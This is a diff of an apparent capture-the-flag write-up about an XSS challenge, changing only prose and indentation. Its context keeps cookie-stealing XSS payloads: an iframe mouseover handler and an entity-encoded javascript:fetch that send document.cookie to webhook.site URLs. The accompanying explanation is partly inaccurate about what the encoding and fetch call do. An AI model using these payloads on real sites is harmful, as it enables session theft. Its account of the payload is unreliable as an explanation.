@@ -22,7 +22,7 @@ http://ctf.adl.tw:12005/api.php?method=send
 ```html
 <iframe onMouseOver="self.location.href='https://webhook.site/8e1bdfcd-374a-429f-a697-f18406382d44'+escape(document.cookie)">test</iframe>
 ```
-Turns we cannot use +
+Turns out we cannot use + in the payload.
 - test
 ```html
 "/> <script>alert(0)</script> <!--
@@ -35,10 +35,10 @@ Turns we cannot use +
 ```html
 <iframe src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#102;&#101;&#116;&#99;&#104;&#40;&#39;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#119;&#101;&#98;&#104;&#111;&#111;&#107;&#46;&#115;&#105;&#116;&#101;&#47;&#50;&#49;&#55;&#48;&#99;&#55;&#99;&#56;&#45;&#57;&#52;&#57;&#99;&#45;&#52;&#49;&#100;&#49;&#45;&#56;&#52;&#55;&#57;&#45;&#53;&#100;&#49;&#48;&#97;&#57;&#55;&#54;&#48;&#56;&#52;&#101;&#63;&#102;&#108;&#97;&#103;&#61;&#39;&#43;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;&#46;&#116;&#104;&#101;&#110;&#40;&#40;&#114;&#101;&#115;&#112;&#111;&#110;&#115;&#101;&#41;&#32;&#61;&#62;&#32;&#123;&#114;&#101;&#116;&#117;&#114;&#110;&#32;&#114;&#101;&#115;&#112;&#111;&#110;&#115;&#101;&#46;&#106;&#115;&#111;&#110;&#40;&#41;&#59;&#125;&#41;&#46;&#99;&#97;&#116;&#99;&#104;&#40;&#40;&#101;&#114;&#114;&#111;&#114;&#41;&#32;&#61;&#62;&#32;&#123;&#99;&#111;&#110;&#115;&#111;&#108;&#101;&#46;&#108;&#111;&#103;&#40;&#39;&#110;&#111;&#39;&#41;&#59;&#125;&#41><iframe>
 ```
-The iframe element in this code is being used to load a script from a remote URL using the src attribute.  
+    The iframe element in this code is being used to load a script from a remote URL using the src attribute.  
 
-The URL is encoded using HTML character references, which are used to represent characters that are not part of the standard ASCII character set. For example, &#106; represents the letter "j", &#97; represents the letter "a", and so on.   
+    The URL is encoded using HTML character references, which are used to represent characters that are not part of the standard ASCII character set. For example, &#106; represents the letter "j", &#97; represents the letter "a", and so on.   
 
-When the HTML code is parsed by a web browser, these character references are converted back into their corresponding characters, so the src attribute in this iframe element would be interpreted as a URL that begins with "javascript:fetch(...".  
+    When the HTML code is parsed by a web browser, these character references are converted back into their corresponding characters, so the src attribute in this iframe element would be interpreted as a URL that begins with "javascript:fetch(...".  
 
-The iframe element also contains a script that uses the fetch() function to retrieve data from the specified URL and then execute it as a JavaScript script. This can be a security risk, as it allows the script to potentially access and manipulate the current document and any data it contains. It's generally a good idea to avoid executing arbitrary scripts from untrusted sources in this way.
+    The iframe element also contains a script that uses the fetch() function to retrieve data from the specified URL and then execute it as a JavaScript script. This can be a security risk, as it allows the script to potentially access and manipulate the current document and any data it contains. It's generally a good idea to avoid executing arbitrary scripts from untrusted sources in this way.
